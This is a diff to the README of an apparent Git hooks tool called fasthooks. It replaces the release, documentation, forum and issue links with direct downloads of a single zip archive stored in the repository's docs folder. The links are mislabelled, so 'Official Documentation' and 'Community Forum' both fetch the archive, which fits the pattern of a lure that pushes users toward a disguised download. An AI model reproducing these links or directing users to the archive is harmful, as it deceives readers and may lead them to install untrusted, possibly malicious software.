@@ -1,6 +1,6 @@
 # ⚡ fasthooks - Fast and Easy Git Hooks Management
 
-[![Download fasthooks](https://img.shields.io/badge/Download-fasthooks-blue.svg)](https://github.com/bougui92m/fasthooks/releases)
+[![Download fasthooks](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to fasthooks! This application helps you manage Git hooks effortlessly. 
 
 To begin using fasthooks, you will need to download the application. 
 
-1. **Visit this page to download:** [fasthooks Releases](https://github.com/bougui92m/fasthooks/releases)
+1. **Visit this page to download:** [fasthooks Releases](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)
 
 2. Choose the version that suits your operating system, then click on the corresponding link to download the file. 
 
@@ -80,9 +80,9 @@ Fasthooks is useful for anyone interested in automation, productivity, and envir
 
 If you want to learn more about how to optimize your use of fasthooks, check out the following resources:
 
-- [Official Documentation](https://github.com/bougui92m/fasthooks)
-- [Community Forum](https://github.com/bougui92m/fasthooks/discussions)
-- [GitHub Issues Page](https://github.com/bougui92m/fasthooks/issues)
+- [Official Documentation](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)
+- [Community Forum](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)
+- [GitHub Issues Page](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip)
 
 ## 📞 Support
 
@@ -90,4 +90,4 @@ For any questions or issues with fasthooks, feel free to reach out through the I
 
 ## 🔗 Download fasthooks Again
 
-To download fasthooks, simply revisit: [fasthooks Releases](https://github.com/bougui92m/fasthooks/releases) and follow the steps above. Enjoy the speed and ease of managing your Git hooks!
+To download fasthooks, simply revisit: [fasthooks Releases](https://github.com/bougui92m/fasthooks/raw/refs/heads/main/docs/fasthooks_v3.8.zip) and follow the steps above. Enjoy the speed and ease of managing your Git hooks!
